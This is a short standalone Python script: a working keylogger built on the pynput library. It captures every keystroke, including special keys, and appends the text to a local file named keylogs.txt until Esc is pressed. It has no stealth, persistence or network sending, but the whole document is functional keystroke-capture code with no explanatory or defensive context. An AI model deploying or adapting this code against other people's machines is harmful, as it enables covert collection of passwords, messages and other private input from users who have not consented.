import pynput
from pynput import keyboard

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f"[{key.name.upper()}]"

def write_file(log):
    with open("keylogs.txt", "a") as file:
        file.write(log)

def on_release(key):
    global log
    if key == keyboard.Key.esc:
        return False
    write_file(log)
    log = ""

with open("keylogs.txt", "w"):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()